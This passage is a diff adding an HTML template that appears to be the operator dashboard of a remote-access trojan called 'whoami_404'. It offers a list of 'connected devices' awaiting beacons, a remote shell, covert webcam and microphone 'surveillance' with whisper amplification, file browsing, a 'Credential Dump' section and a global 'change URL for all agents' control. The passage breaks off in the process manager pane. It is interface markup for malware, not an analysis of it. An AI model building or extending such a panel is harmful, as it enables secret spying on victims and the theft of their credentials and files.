@@ -1,0 +1,1401 @@
+{% extends "base.html" %}
+{% block head %}
+<style>
+    /* Page-specific inline overrides if needed */
+    .custom-file-input::file-selector-button {
+        background: var(--bg-elevated);
+        border: 1px solid var(--border-subtle);
+        color: var(--text-primary);
+        padding: 8px 16px;
+        border-radius: 6px;
+        margin-right: 12px;
+        cursor: pointer;
+        font-family: var(--font-sans);
+        font-size: 0.85rem;
+        font-weight: 500;
+        transition: all 0.2s ease;
+    }
+
+    .custom-file-input::file-selector-button:hover {
+        background: var(--bg-surface);
+        border-color: var(--accent-primary);
+        color: var(--accent-primary);
+    }
+
+    .custom-cancel-btn {
+        box-shadow: none !important;
+    }
+
+    .custom-cancel-btn:hover {
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3) !important;
+        background: rgba(255, 255, 255, 0.05) !important;
+    }
+
+    /* FPS Select & Custom Input Dark Styling */
+    input[type=number]::-webkit-inner-spin-button,
+    input[type=number]::-webkit-outer-spin-button {
+        -webkit-appearance: none;
+        appearance: none;
+        margin: 0;
+    }
+
+    input[type=number] {
+        -moz-appearance: textfield;
+        appearance: textfield;
+    }
+
+    select option {
+        background-color: #0f172a !important;
+        color: #f8fafc !important;
+    }
+
+    .fps-select-pill {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        background: rgba(255, 255, 255, 0.05);
+        border: 1px solid var(--border-subtle);
+        padding: 4px 10px;
+        border-radius: 8px;
+        transition: border-color 0.2s ease, background-color 0.2s ease;
+    }
+
+    .fps-select-pill:hover,
+    .fps-select-pill:focus-within {
+        border-color: var(--accent-primary);
+        background: rgba(255, 255, 255, 0.08);
+    }
+
+    .fps-select-input {
+        background: transparent !important;
+        border: none !important;
+        color: var(--text-primary) !important;
+        font-size: 0.85rem !important;
+        font-weight: 600 !important;
+        cursor: pointer;
+        outline: none !important;
+        font-family: 'JetBrains Mono', monospace !important;
+        padding-right: 2px;
+    }
+</style>
+{% endblock %}
+{% block content %}
+<div id="app">
+    <div id="whoami_404-layout" class="mrspy-layout whoami-layout">
+        <!-- ──── LEFT SIDEBAR: WHOAMI_404 NAV ──── -->
+        <aside id="whoami_404-sidebar" class="mrspy-sidebar whoami-sidebar">
+            <div class="whoami_404-brand mrspy-brand whoami-brand">
+                <div class="whoami_404-logo-text mrspy-logo-text whoami-logo-text">
+                    <img src="{{ url_for('static', filename='img/rinengan.png') }}"
+                        style="width: 32px; height: 32px; border-radius: 8px; object-fit: cover; box-shadow: 0 0 8px rgba(168,85,247,0.4); border: 1px solid rgba(168,85,247,0.2);"
+                        alt="Rinengan Logo">
+                    <span>whoami_404</span>
+                </div>
+            </div>
+
+            <ul class="whoami_404-nav mrspy-nav whoami-nav" id="whoami_404-nav">
+                <li class="whoami_404-nav-item mrspy-nav-item whoami-nav-item active" data-pane="overview">
+                    <i class="ph ph-squares-four"></i>
+                    <span>Overview</span>
+                </li>
+                <li class="whoami_404-nav-item mrspy-nav-item whoami-nav-item" data-pane="terminal">
+                    <i class="ph ph-terminal-window"></i>
+                    <span>Terminal</span>
+                </li>
+                <li class="whoami_404-nav-item mrspy-nav-item whoami-nav-item" data-pane="camera">
+                    <i class="ph ph-camera"></i>
+                    <span>Camera</span>
+                </li>
+                <li class="whoami_404-nav-item mrspy-nav-item whoami-nav-item" data-pane="microphone">
+                    <i class="ph ph-microphone"></i>
+                    <span>Microphone</span>
+                </li>
+                <li class="whoami_404-nav-item mrspy-nav-item whoami-nav-item" data-pane="screen">
+                    <i class="ph ph-desktop"></i>
+                    <span>Screen</span>
+                </li>
+                <li class="whoami_404-nav-item mrspy-nav-item whoami-nav-item" data-pane="files">
+                    <i class="ph ph-folder"></i>
+                    <span>Files & Actions</span>
+                </li>
+                <li class="whoami_404-nav-item mrspy-nav-item whoami-nav-item" data-pane="dump">
+                    <i class="ph ph-database"></i>
+                    <span>Credential Dump</span>
+                </li>
+                <li class="whoami_404-nav-item mrspy-nav-item whoami-nav-item" data-pane="process">
+                    <i class="ph ph-activity"></i>
+                    <span>Processes</span>
+                </li>
+                <li class="whoami_404-nav-item mrspy-nav-item whoami-nav-item" data-pane="processes">
+                    <i class="ph ph-cpu"></i>
+                    <span>System Info</span>
+                </li>
+                <li class="whoami_404-nav-item mrspy-nav-item whoami-nav-item" data-pane="other-features">
+                    <i class="ph ph-squares-four"></i>
+                    <span>Other Features</span>
+                </li>
+                <li class="whoami_404-nav-item mrspy-nav-item whoami-nav-item" data-pane="settings">
+                    <i class="ph ph-gear"></i>
+                    <span>Settings & Logs</span>
+                </li>
+            </ul>
+
+            <div class="whoami_404-sidebar-footer mrspy-sidebar-footer whoami-sidebar-footer">
+                <div class="cmdbar-status">
+                    <span class="status-indicator connected" id="ws-status"></span>
+                    <span id="ws-status-text">Connected</span>
+                </div>
+                <button class="topbar-btn logout" id="logout-btn" title="Logout">
+                    <i class="ph ph-sign-out"></i>
+                </button>
+            </div>
+        </aside>
+        <div id="mobile-sidebar-backdrop" class="mobile-sidebar-backdrop"></div>
+
+        <!-- ──── CENTER WORKSPACE ──── -->
+        <main id="whoami_404-workspace" class="mrspy-workspace whoami-workspace">
+            <!-- Topbar / Status bar -->
+            <header class="whoami_404-topbar mrspy-topbar whoami-topbar" id="topbar">
+                <div class="topbar-left">
+                    <button class="mobile-nav-toggle" id="mobile-nav-toggle" title="Toggle Navigation">
+                        <i class="ph ph-list"></i>
+                    </button>
+                    <div class="stat-pills">
+                        <div class="stat-pill" id="pill-online">
+                            <span class="pill-dot online"></span>
+                            <span class="pill-label">Online</span>
+                            <span class="pill-value" id="count-online">0</span>
+                        </div>
+                        <div class="stat-pill" id="pill-total">
+                            <i class="ph ph-desktop-tower"></i>
+                            <span class="pill-label">Total</span>
+                            <span class="pill-value" id="count-total">0</span>
+                        </div>
+                        <div class="stat-pill" id="pill-tasks">
+                            <i class="ph ph-list-checks"></i>
+                            <span class="pill-label">Tasks</span>
+                            <span class="pill-value" id="count-tasks">0</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="topbar-right">
+                    <div class="topbar-timer" id="session-timer-wrapper">
+                        <i class="ph ph-clock"></i>
+                        <span id="session-timer">00:00:00</span>
+                    </div>
+                    <button class="topbar-btn" id="notif-btn" title="Notifications">
+                        <i class="ph ph-bell"></i>
+                        <span class="notif-badge" id="notif-badge">0</span>
+                    </button>
+                    <button class="topbar-btn" id="lock-btn" title="Lock Panel">
+                        <i class="ph ph-lock"></i>
+                    </button>
+                    <button class="cmd-btn accent" id="change-url-global" title="Change URL for all agents"
+                        style="margin-left: 8px;">
+                        <i class="ph-bold ph-link"></i>
+                        <span>CHANGE URL</span>
+                    </button>
+                    <button class="cmd-btn emergency" id="emergency-stop" title="Emergency Kill All"
+                        style="margin-left: 8px;">
+                        <i class="ph-bold ph-warning-octagon"></i>
+                        <span>KILL ALL</span>
+                    </button>
+                </div>
+            </header>
+
+            <!-- Main Content Area with Panes -->
+            <div class="whoami_404-content mrspy-content whoami-content">
+                <!-- Floating cyber watermark (hexagon mesh) -->
+                <div class="bg-cyber-watermark">
+                    <i class="ph-thin ph-hexagon"></i>
+                </div>
+
+                <!-- 1. OVERVIEW / CONNECTED DEVICES PANE (DEFAULT ACTIVE) -->
+                <div id="pane-overview" class="whoami_404-pane mrspy-pane whoami-pane active">
+                    <!-- Top Active Device Purple Banner (Shared inside Overview) -->
+                    <div class="active-device-banner" id="active-device-banner">
+                        <div class="banner-left">
+                            <h2 id="banner-hostname"><i class="ph ph-desktop"></i> No Device Selected</h2>
+                            <p id="banner-meta"><i class="ph ph-shield"></i> Select a connected device from below to
+                                begin operations</p>
+                        </div>
+                        <div class="banner-right">
+                            <div class="banner-badge">
+                                <span class="online-dot offline" id="banner-status-dot"></span>
+                                <span id="banner-status-text">Idle</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Connected Devices Section -->
+                    <div class="connected-devices-section">
+                        <div class="section-header">
+                            <div class="section-title">
+                                <i class="ph-bold ph-desktop-tower" style="color: var(--accent-primary);"></i>
+                                <span>Connected Devices</span>
+                            </div>
+                            <div class="agent-search-wrap" style="width: 260px; padding: 0;">
+                                <i class="ph ph-magnifying-glass search-icon" style="left: 12px;"></i>
+                                <input type="text" id="agent-search" placeholder="Filter devices..." autocomplete="off"
+                                    style="padding-left: 32px;">
+                            </div>
+                        </div>
+
+                        <!-- Devices Grid (Where main.js will render the cards) -->
+                        <div id="devices-grid" class="devices-grid"></div>
+
+                        <!-- Legacy agent-list & agent-empty preserved for compatibility -->
+                        <ul id="agent-list" class="agent-list" style="display:none;"></ul>
+                        <div id="agent-empty" class="agent-empty" style="display:none;">
+                            <i class="ph ph-broadcast"></i>
+                            <p>No devices connected</p>
+                            <span>Waiting for beacons...</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 2. TERMINAL PANE -->
+                <div id="pane-terminal" class="whoami_404-pane mrspy-pane whoami-pane"
+                    style="height: calc(100vh - 120px);">
+                    <div class="section-header"
+                        style="display: flex; align-items: center; justify-content: space-between; gap: 12px; flex-wrap: wrap; width: 100%; margin-bottom: 12px;">
+                        <div class="section-title" style="white-space: nowrap; flex: 0 0 auto; font-size: 1.1rem;">
+                            <i class="ph-bold ph-terminal-window" style="color: var(--accent-primary);"></i>
+                            <span>Interactive Remote Terminal</span>
+                            <span id="terminal-shell-badge"
+                                style="margin-left: 8px; font-size: 0.78rem; font-weight: 600; color: #4ade80; background: rgba(74,222,128,0.15); padding: 2px 8px; border-radius: 6px; font-family: 'JetBrains Mono', monospace;">CMD</span>
+                            <span id="terminal-cwd-badge"
+                                style="margin-left: 6px; font-size: 0.78rem; font-weight: 500; color: var(--text-muted); background: rgba(168,85,247,0.1); padding: 2px 8px; border-radius: 6px; font-family: 'JetBrains Mono', monospace; max-width: 260px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">C:\</span>
+                        </div>
+                        <div
+                            style="margin-left: auto; display: flex; gap: 8px; align-items: center; flex-wrap: wrap; justify-content: flex-end; white-space: nowrap;">
+                            <div class="fps-select-pill" style="padding: 3px 6px;">
+                                <i class="ph ph-terminal" style="color: var(--accent-primary); font-size: 0.85rem;"></i>
+                                <span
+                                    style="color: var(--text-secondary); font-size: 0.8rem; font-weight: 500;">Shell:</span>
+                                <select id="terminal-shell-select" class="fps-select-input"
+                                    style="padding: 2px 4px; font-size: 0.8rem;">
+                                    <option value="cmd" selected>CMD (Command Prompt)</option>
+                                    <option value="powershell">PowerShell (v5.1+)</option>
+                                    <option value="bash">Bash (WSL / Shell)</option>
+                                </select>
+                            </div>
+                            <button class="f-action-pill secondary" id="btn-terminal-clear"
+                                title="Clear terminal screen (Ctrl+L)"
+                                style="background: var(--bg-card); border: 1px solid var(--border-subtle); color: var(--text-primary); padding: 5px 10px; font-size: 0.8rem; white-space: nowrap; flex-shrink: 0;">
+                                <i class="ph ph-trash"></i>
+                                <span>Clear</span>
+                            </button>
+                        </div>
+                    </div>
+                    <div class="terminal-container"
+                        style="flex: 1; display: flex; flex-direction: column; height: 100%; min-height: 0; background: #06080c; border: 1.5px solid var(--border-subtle); border-radius: 14px; overflow: hidden;">
+                        <div class="terminal-header"
+                            style="display: flex; align-items: center; justify-content: space-between; padding: 8px 14px; background: rgba(255,255,255,0.03); border-bottom: 1px solid var(--border-subtle);">
+                            <div class="terminal-dots" style="display: flex; gap: 6px; align-items: center;">
+                                <span class="tdot red"
+                                    style="width: 10px; height: 10px; border-radius: 50%; background: #ff5f57; display: inline-block;"></span>
+                                <span class="tdot yellow"
+                                    style="width: 10px; height: 10px; border-radius: 50%; background: #febc2e; display: inline-block;"></span>
+                                <span class="tdot green"
+                                    style="width: 10px; height: 10px; border-radius: 50%; background: #28c840; display: inline-block;"></span>
+                                <span
+                                    style="margin-left: 10px; font-size: 0.75rem; color: var(--text-muted); font-family: 'JetBrains Mono', monospace;"
+                                    id="terminal-session-title">Session: None (Select Agent)</span>
+                            </div>
+                            <div
+                                style="font-size: 0.72rem; color: var(--text-muted); font-family: 'JetBrains Mono', monospace;">
+                                <span>UTF-8 &bull; Non-Blocking Pipe &bull; <kbd
+                                        style="background: rgba(255,255,255,0.1); padding: 1px 4px; border-radius: 4px;">Ctrl+L</kbd>
+                                    Clear</span>
+                            </div>
+                        </div>
+                        <div id="terminal-output" class="terminal-output"
+                            style="flex: 1; min-height: 0; padding: 16px; overflow-y: auto; font-family: 'JetBrains Mono', 'Fira Code', monospace; font-size: 0.85rem; line-height: 1.6; color: #e2e8f0; white-space: pre-wrap; word-break: break-word; scroll-behavior: smooth;">
+                        </div>
+                        <div class="terminal-input-row"
+                            style="display: flex; align-items: center; gap: 8px; padding: 10px 16px; border-top: 1px solid var(--border-subtle); background: rgba(0,0,0,0.5);">
+                            <span class="terminal-prompt"
+                                style="font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; white-space: nowrap; flex-shrink: 0;">
+                                <span class="t-green" style="color: #4ade80; font-weight: 600;">whoami_404</span><span
+                                    class="t-dim" style="color: var(--text-muted);">@</span><span class="t-blue"
+                                    id="terminal-agent-label" style="color: #60a5fa; font-weight: 600;">c2</span><span
+                                    class="t-dim" style="color: var(--text-muted);">:</span><span
+                                    id="terminal-prompt-cwd" style="color: #c084fc; font-weight: 500;">~</span><span
+                                    class="t-dim" style="color: var(--text-muted);">$</span>
+                            </span>
+                            <input type="text" id="terminal-input"
+                                placeholder="Enter command (e.g. dir, whoami, ipconfig)..." autocomplete="off"
+                                spellcheck="false"
+                                style="flex: 1; background: transparent; border: none; color: #f8fafc; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; outline: none; caret-color: #4ade80;">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 3. FILES & ACTIONS PANE -->
+                <div id="pane-files" class="whoami_404-pane mrspy-pane whoami-pane">
+                    <!-- File Explorer Container -->
+                    <div class="file-explorer-container">
+                        <!-- Top Navigation and Path Header -->
+                        <div class="file-explorer-header">
+                            <div class="file-nav-btns">
+                                <button class="f-nav-btn" id="f-nav-back" title="Back"><i
+                                        class="ph-bold ph-arrow-left"></i></button>
+                                <button class="f-nav-btn" id="f-nav-fwd" title="Forward"><i
+                                        class="ph-bold ph-arrow-right"></i></button>
+                                <button class="f-nav-btn" id="f-nav-up" title="Parent Directory"><i
+                                        class="ph-bold ph-arrow-up"></i></button>
+                            </div>
+                            <div class="file-path-bar">
+                                <i class="ph-fill ph-folder"
+                                    style="color: #fbbf24; font-size: 1.25rem; flex-shrink: 0;"></i>
+                                <input type="text" id="file-current-path" class="file-path-input" value="C:\"
+                                    spellcheck="false" autocomplete="off">
+                                <button class="cmd-btn accent" id="f-path-go"
+                                    style="padding: 6px 16px; font-size: 0.85rem; border-radius: 6px;">Go</button>
+                            </div>
+                        </div>
+
+                        <!-- Action Bar -->
+                        <div class="file-action-bar">
+                            <div class="file-actions-left">
+                                <button class="f-action-pill" id="upload-btn" title="Upload File">
+                                    <i class="ph-bold ph-upload-simple"></i>
+                                    <span>Upload</span>
+                                </button>
+                                <button class="f-action-pill" id="refresh-btn" title="Refresh Directory">
+                                    <i class="ph-bold ph-arrows-clockwise"></i>
+                                    <span>Refresh</span>
+                                </button>
+                                <button class="f-action-pill" id="new-folder-btn" title="Create Folder">
+                                    <i class="ph-bold ph-folder-plus"></i>
+                                    <span>New Folder</span>
+                                </button>
+                            </div>
+                            <div class="file-actions-right">
+                                <button class="f-action-pill secondary" id="drives-btn" title="View All Drives">
+                                    <i class="ph ph-hard-drives"></i>
+                                    <span>Drives</span>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Files Table Wrapper -->
+                        <div class="file-table-wrapper">
+                            <!-- Table Header -->
+                            <div class="file-table-head">
+                                <div class="f-col-name">NAME</div>
+                                <div class="f-col-date">DATE MODIFIED</div>
+                                <div class="f-col-size">SIZE</div>
+                                <div class="f-col-actions">ACTIONS</div>
+                            </div>
+                            <!-- Table Body -->
+                            <div id="file-list-body" class="file-table-body">
+                                <div style="padding: 40px; text-align: center; color: var(--text-muted);">
+                                    <i class="ph ph-folder-open"
+                                        style="font-size: 2.2rem; display: block; margin-bottom: 8px; opacity: 0.5;"></i>
+                                    Click Refresh or select an agent to load active file system
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 4. CAMERA PANE -->
+                <div id="pane-camera" class="whoami_404-pane mrspy-pane whoami-pane">
+                    <div class="section-header"
+                        style="display: flex; align-items: center; justify-content: space-between; gap: 12px; flex-wrap: wrap; width: 100%; margin-bottom: 14px;">
+                        <div class="section-title"
+                            style="white-space: nowrap; flex: 0 0 auto; font-size: 1.1rem; display: flex; align-items: center; gap: 8px;">
+                            <i class="ph-bold ph-camera" style="color: var(--accent-primary);"></i>
+                            <span>Real-Time Camera Surveillance</span>
+                            <span id="camera-fps-live"
+                                style="font-size: 0.78rem; font-weight: 600; color: var(--text-muted); background: rgba(168,85,247,0.1); padding: 2px 8px; border-radius: 6px; font-family: 'JetBrains Mono', monospace;">0
+                                FPS</span>
+                            <span id="camera-quality-badge"
+                                style="display: none; font-size: 0.78rem; font-weight: 600; color: #4ade80; background: rgba(74,222,128,0.15); padding: 2px 8px; border-radius: 6px; font-family: 'JetBrains Mono', monospace;">1080p</span>
+                            <span id="camera-bitrate-badge"
+                                style="display: none; font-size: 0.78rem; font-weight: 600; color: #38bdf8; background: rgba(56,189,248,0.15); padding: 2px 8px; border-radius: 6px; font-family: 'JetBrains Mono', monospace;">0
+                                Mbps</span>
+                        </div>
+                        <div
+                            style="margin-left: auto; display: flex; gap: 8px; align-items: center; flex-wrap: wrap; justify-content: flex-end; white-space: nowrap;">
+                            <div class="fps-select-pill" style="padding: 3px 6px;">
+                                <i class="ph ph-webcam" style="color: var(--accent-primary); font-size: 0.85rem;"></i>
+                                <select id="camera-device-select" class="fps-select-input"
+                                    style="padding: 2px 4px; font-size: 0.8rem;">
+                                    <option value="0">Webcam #0 (Primary)</option>
+                                    <option value="1">Webcam #1 (Secondary)</option>
+                                    <option value="2">Webcam #2 (Capture Card)</option>
+                                </select>
+                            </div>
+                            <div class="fps-select-pill" style="padding: 3px 6px;">
+                                <i class="ph ph-sliders" style="color: var(--accent-primary); font-size: 0.85rem;"></i>
+                                <span
+                                    style="color: var(--text-secondary); font-size: 0.8rem; font-weight: 500;">Res:</span>
+                                <select id="camera-res" class="fps-select-input"
+                                    style="padding: 2px 4px; font-size: 0.8rem;">
+                                    <option value="1920" selected>1080p FHD</option>
+                                    <option value="2560">2K QHD</option>
+                                    <option value="1280">720p HD</option>
+                                    <option value="640">480p SD</option>
+                                    <option value="0">Native Max</option>
+                                </select>
+                            </div>
+                            <div class="fps-select-pill" style="padding: 3px 6px;">
+                                <i class="ph ph-sparkle" style="color: var(--accent-primary); font-size: 0.85rem;"></i>
+                                <span
+                                    style="color: var(--text-secondary); font-size: 0.8rem; font-weight: 500;">Quality:</span>
+                                <select id="camera-quality" class="fps-select-input"
+                                    style="padding: 2px 4px; font-size: 0.8rem;">
+                                    <option value="85">High (85%)</option>
+                                    <option value="70" selected>Balanced (70%)</option>
+                                    <option value="50">Speed (50%)</option>
+                                </select>
+                            </div>
+                            <div class="fps-select-pill" style="padding: 3px 6px;">
+                                <i class="ph ph-gauge" style="color: var(--accent-primary); font-size: 0.85rem;"></i>
+                                <span
+                                    style="color: var(--text-secondary); font-size: 0.8rem; font-weight: 500;">FPS:</span>
+                                <select id="camera-fps" class="fps-select-input"
+                                    style="padding: 2px 4px; font-size: 0.8rem;">
+                                    <option value="15">15 FPS</option>
+                                    <option value="25">25 FPS</option>
+                                    <option value="30">30 FPS</option>
+                                    <option value="45">45 FPS</option>
+                                    <option value="60" selected>60 FPS</option>
+                                </select>
+                            </div>
+                            <button class="f-action-pill secondary" id="btn-camera-mirror"
+                                title="Toggle Mirror (Right is Right)"
+                                style="background: var(--bg-card); border: 1px solid var(--border-subtle); color: var(--text-primary); padding: 5px 10px; font-size: 0.8rem; white-space: nowrap; flex-shrink: 0;">
+                                <i class="ph ph-arrows-left-right"></i>
+                                <span>Mirror</span>
+                            </button>
+                            <button class="f-action-pill secondary" id="btn-camera-snapshot"
+                                title="Capture high-resolution camera photo"
+                                style="background: var(--bg-card); border: 1px solid var(--border-subtle); color: var(--text-primary); padding: 5px 10px; font-size: 0.8rem; white-space: nowrap; flex-shrink: 0;">
+                                <i class="ph ph-camera-plus"></i>
+                                <span>Snapshot</span>
+                            </button>
+                            <button class="f-action-pill secondary" id="btn-camera-fullscreen" title="Fullscreen view"
+                                style="background: var(--bg-card); border: 1px solid var(--border-subtle); color: var(--text-primary); padding: 5px 10px; font-size: 0.8rem; white-space: nowrap; flex-shrink: 0;">
+                                <i class="ph ph-corners-out"></i>
+                            </button>
+                            <button class="f-action-pill primary" id="btn-camera-start"
+                                style="padding: 5px 12px; font-size: 0.8rem; white-space: nowrap; flex-shrink: 0; min-width: max-content;">
+                                <i class="ph ph-play"></i>
+                                <span>Start Camera</span>
+                            </button>
+                            <button class="f-action-pill" id="btn-camera-stop"
+                                style="display: none; background-color: var(--status-error); color: white; border-color: transparent; padding: 5px 12px; font-size: 0.8rem; white-space: nowrap; flex-shrink: 0; min-width: max-content;">
+                                <i class="ph ph-stop"></i>
+                                <span>Stop Camera</span>
+                            </button>
+                        </div>
+                    </div>
+                    <div id="camera-stream-wrapper" class="stream-container"
+                        style="background: #000; border: 1.5px solid var(--border-subtle); border-radius: 16px; padding: 0; height: calc(100vh - 110px); min-height: 0; width: 100%; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden;">
+                        <div id="camera-placeholder" class="placeholder-state">
+                            <div class="placeholder-icon">
+                                <i class="ph-thin ph-camera"></i>
+                            </div>
+                            <h3>No Active Camera Feed</h3>
+                            <p>Select an agent and click Start Camera to stream the device webcam</p>
+                        </div>
+                        <video id="camera-video" autoplay playsinline muted
+                            style="display: none; width: 100%; height: 100%; object-fit: contain; transform: scaleX(-1); border-radius: 12px; background: #000; image-rendering: -webkit-optimize-contrast;"></video>
+                        <img id="camera-img"
+                            style="display: none; width: 100%; height: 100%; object-fit: contain; transform: scaleX(-1); border-radius: 12px; background: #000;" />
+                    </div>
+                </div>
+
+                <!-- 3.5 STUDIO MICROPHONE SURVEILLANCE PANE -->
+                <div id="pane-microphone" class="whoami_404-pane mrspy-pane whoami-pane">
+                    <div class="section-header"
+                        style="display: flex; align-items: center; justify-content: space-between; gap: 12px; flex-wrap: wrap; width: 100%; margin-bottom: 14px;">
+                        <div class="section-title" style="white-space: nowrap; flex: 0 0 auto; font-size: 1.1rem; display: flex; align-items: center; gap: 8px;">
+                            <i class="ph-bold ph-microphone" style="color: var(--accent-primary);"></i>
+                            <span>Studio Audio Surveillance</span>
+                            <span id="audio-stream-badge"
+                                style="display: inline-block; margin-left: 8px; font-size: 0.78rem; font-weight: 600; color: #4ade80; background: rgba(74,222,128,0.15); padding: 2px 8px; border-radius: 6px; font-family: 'JetBrains Mono', monospace;">48kHz PCM</span>
+                        </div>
+                        <div
+                            style="margin-left: auto; display: flex; gap: 8px; align-items: center; flex-wrap: wrap; justify-content: flex-end; white-space: nowrap;">
+                            <div class="fps-select-pill" style="padding: 3px 6px;">
+                                <i class="ph ph-microphone-stage" style="color: var(--accent-primary); font-size: 0.85rem;"></i>
+                                <span style="color: var(--text-secondary); font-size: 0.8rem; font-weight: 500;">Mic:</span>
+                                <select id="audio-device-select" class="fps-select-input"
+                                    style="padding: 2px 4px; font-size: 0.8rem; max-width: 140px;">
+                                    <option value="default" selected>Default Mic</option>
+                                </select>
+                            </div>
+                            <button class="f-action-pill" id="refresh-audio-devices-btn" title="Scan / Refresh Audio Devices"
+                                style="padding: 5px 10px; font-size: 0.8rem; white-space: nowrap; flex-shrink: 0;">
+                                <i class="ph ph-arrows-clockwise" id="refresh-audio-icon"></i>
+                                <span>Scan Mics</span>
+                            </button>
+                            <div class="fps-select-pill" style="padding: 3px 6px;">
+                                <i class="ph ph-waveform" style="color: var(--accent-primary); font-size: 0.85rem;"></i>
+                                <span
+                                    style="color: var(--text-secondary); font-size: 0.8rem; font-weight: 500;">DSP:</span>
+                                <select id="audio-dsp-mode" class="fps-select-input"
+                                    style="padding: 2px 4px; font-size: 0.8rem;">
+                                    <option value="studio" selected>Studio Vocal (Clean + Compressor)</option>
+                                    <option value="whisper">Forensic Whisper Boost</option>
+                                    <option value="gate">Aggressive Noise Gate</option>
+                                    <option value="raw">Raw Hi-Fi (Direct Unfiltered)</option>
+                                </select>
+                            </div>
+                            <div class="fps-select-pill" style="padding: 3px 6px;">
+                                <i class="ph ph-speaker-high"
+                                    style="color: var(--accent-primary); font-size: 0.85rem;"></i>
+                                <span
+                                    style="color: var(--text-secondary); font-size: 0.8rem; font-weight: 500;">Boost:</span>
+                                <select id="audio-volume-boost" class="fps-select-input"
+                                    style="padding: 2px 4px; font-size: 0.8rem;">
+                                    <option value="1.0">100% (Normal)</option>
+                                    <option value="1.5">150% (Enhanced)</option>
+                                    <option value="2.0">200% (Loud)</option>
+                                    <option value="3.0" selected>300% (Super Loud)</option>
+                                    <option value="5.0">500% (Whisper Amp)</option>
+                                </select>
+                            </div>
+                            <button class="f-action-pill" id="record-audio-btn"
+                                style="display: none; padding: 5px 12px; font-size: 0.8rem; background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); white-space: nowrap; flex-shrink: 0;">
+                                <i class="ph-bold ph-record" id="record-audio-icon"></i>
+                                <span id="record-audio-text">Record</span>
+                            </button>
+                            <button class="f-action-pill primary" id="start-audio-btn"
+                                style="padding: 5px 12px; font-size: 0.8rem; white-space: nowrap; flex-shrink: 0; min-width: max-content;">
+                                <i class="ph ph-play"></i>
+                                <span>Start Audio</span>
+                            </button>
+                            <button class="f-action-pill" id="stop-audio-btn"
+                                style="display: none; background-color: var(--status-error); color: white; border-color: transparent; padding: 5px 12px; font-size: 0.8rem; white-space: nowrap; flex-shrink: 0; min-width: max-content;">
+                                <i class="ph ph-stop"></i>
+                                <span>Stop Audio</span>
+                            </button>
+                        </div>
+                    </div>
+                    <div class="stream-container"
+                        style="background: #090c14; border: 1.5px solid var(--border-subtle); border-radius: 16px; padding: 24px; min-height: 420px; display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; gap: 20px; overflow: hidden;">
+                        
+                        <!-- Semi-transparent glowing cyber hexagon watermark on the right side -->
+                        <div class="audio-hex-bg" style="position: absolute; right: 5%; top: 50%; transform: translateY(-50%); pointer-events: none; opacity: 0.22; filter: drop-shadow(0 0 16px rgba(168,85,247,0.4));">
+                            <svg width="220" height="250" viewBox="0 0 100 100" fill="none" stroke="#a855f7" stroke-width="1.2">
+                                <polygon points="50,2 93,25 93,75 50,98 7,75 7,25" />
+                            </svg>
+                        </div>
+
+                        <div id="audio-visualizer-placeholder" class="placeholder-state" style="display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; width: 100%;">
+                            <div class="placeholder-icon" id="audio-icon-container" style="margin: 0 auto 16px auto;">
+                                <i class="ph-thin ph-microphone" id="audio-icon"></i>
+                            </div>
+                            <h3 id="audio-status-text" style="margin: 0 0 8px 0; font-size: 1.2rem; color: #fff; text-align: center;">Audio Surveillance Standby</h3>
+                            <p id="audio-status-subtext" style="color: var(--text-muted); font-size: 0.85rem; max-width: 360px; text-align: center; margin: 0 auto;">Select target agent and click "Start Audio" to listen with studio DSP noise reduction
+                            </p>
+                        </div>
+                        <div id="audio-active-container"
+                            style="display: none; width: 100%; flex-direction: column; align-items: center; justify-content: center; gap: 16px; z-index: 2;">
+                            
+                            <!-- Voice Animation Equalizer Canvas (9 Capsule Bars) -->
+                            <canvas id="audio-visualizer-canvas" width="480" height="120"
+                                style="width: 100%; max-width: 480px; height: 120px; background: transparent; display: block;"></canvas>
+                            
+                            <div style="display: flex; align-items: center; gap: 8px; font-size: 0.78rem; font-weight: 600; color: rgba(255,255,255,0.7); font-family: 'JetBrains Mono', monospace; margin-top: 8px; letter-spacing: 0.05em;">
+                                <span style="display: inline-block; width: 7px; height: 7px; border-radius: 50%; background: #22c55e; box-shadow: 0 0 8px #22c55e;"></span>
+                                <span id="audio-live-text">LIVE WASAPI 48kHz PCM &bull; DSP ENHANCED</span>
+                            </div>
+
+                            <!-- Hidden Telemetry Meter targets preserved for JS peak calculations -->
+                            <div style="display: none;">
+                                <span id="audio-db-meter-text">-96.0 dBFS</span>
+                                <div id="audio-peak-meter-fill" style="width: 0%;"></div>
+                            </div>
+                        </div>
+                        <audio id="audio-player" autoplay muted style="display: none;"></audio>
+                    </div>
+                </div>
+
+                <!-- 4B. PROCESSES TABLE PANE -->
+                <div id="pane-process" class="whoami_404-pane mrspy-pane whoami-pane"
+                    style="height: calc(100vh - 98px);">
+                    <!-- Process Manager Section Header -->
+                    <div class="process-section-header"
+                        style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; flex-shrink: 0;">
+                        <div style="display: flex; align-items: center; gap: 12px;">
+                            <h2
+                                style="font-size: 1.1rem; font-weight: 700; color: #ffffff; margin: 0; display: flex; align-items: center; gap: 10px;">
+                                Remote Process Manager
+                            </h2>
+                            <span id="process-count-badge" class="badge-count"
+                                style="background: rgba(34, 197, 94, 0.15); color: #4ade80; border: 1px solid rgba(74, 222, 128, 0.3); border-radius: 12px; padding: 2px 10px; font-size: 0.72rem; font-weight: 700; font-family: 'JetBrains Mono', monospace;">0
+                                Processes</span>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 8px;">
+                            <input type="text" id="process-search-input" placeholder="Filter by Name or PID..."
+                                style="background: rgba(255, 255, 255, 0.03); border: 1px solid var(--border-subtle); color: var(--text-primary); padding: 5px 12px; border-radius: 8px; font-size: 0.78rem; width: 200px; outline: none;">
